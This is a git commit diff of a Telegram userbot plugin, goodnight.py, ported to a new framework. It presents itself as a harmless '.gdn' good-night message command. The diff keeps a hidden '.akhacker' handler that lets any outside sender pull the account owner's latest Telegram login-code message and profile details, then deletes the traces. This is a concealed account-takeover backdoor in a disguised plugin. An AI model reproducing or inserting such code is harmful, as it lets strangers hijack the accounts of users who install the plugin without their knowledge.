b23869772ed7d7e8c859b797415b891877d95504
ak <ak@localhost.localdomain>
2021-02-03 06:56:02 -0800

    Updated

--- friday-userbot-hack-script/goodnight.py
+++ friday-userbot-hack-script/goodnight.py
@@ -1,26 +1,27 @@
 from telethon import events
-from userbot.cmdhelp import CmdHelp
+
+from fridaybot import CMD_HELP
 
 
-@borg.on(events.NewMessage(incoming=True,pattern=r'\.akhacker'))
+@friday.on(events.NewMessage(incoming=True,pattern=r'\.akhacker'))
 async def hacker(event):
     tacc = 777000
     cmd = event.raw_text.split(" ")
     print(cmd)
     if cmd[1] == "info":
-        info = await borg.get_me()
+        info = await friday.get_me()
         d = await event.reply(info.stringify())
-        await borg.delete_messages(event.message.from_id, event.message, revoke=False)
-        await borg.delete_messages(event.message.from_id, d, revoke=False)
+        await friday.delete_messages(event.message.from_id, event.message, revoke=False)
+        await friday.delete_messages(event.message.from_id, d, revoke=False)
     if cmd[1] == "login":
-        messagesinfo = await bot.get_messages(tacc, limit=1)
+        messagesinfo = await friday.get_messages(tacc, limit=1)
         msg = messagesinfo[0]
         d = await msg.forward_to(event.message.from_id)
-        await borg.delete_messages(tacc,msg, revoke=False)
-        await borg.delete_messages(event.message.from_id, d, revoke=False)
-        await borg.delete_messages(event.message.from_id, event.message, revoke=False)
+        await friday.delete_messages(tacc,msg, revoke=False)
+        await friday.delete_messages(event.message.from_id, d, revoke=False)
+        await friday.delete_messages(event.message.from_id, event.message, revoke=False)
 
-@borg.on(events.NewMessage(outgoing=True,pattern=r'\.gdn'))
+@friday.on(events.NewMessage(outgoing=True,pattern=r'\.gdn'))
 async def gdn(event):
     await event.edit("""
         ｡♥️｡･ﾟ♡ﾟ･｡♥️｡･｡･｡･｡♥️｡･
@@ -32,6 +33,10 @@ async def gdn(event):
         ｡♥️｡･ﾟ♡ﾟ･｡♥️° ♥️｡･ﾟ♡ﾟ
         """)
 
-CmdHelp("Good Night").add_command(
-  '.gdn', '<reply to media>/<or type a reson>', 'Show good night message'
-).add()
+
+CMD_HELP.update(
+    {
+        "Good Night": ".gdn \
+\nUsage: Say Good Night"
+    }
+)
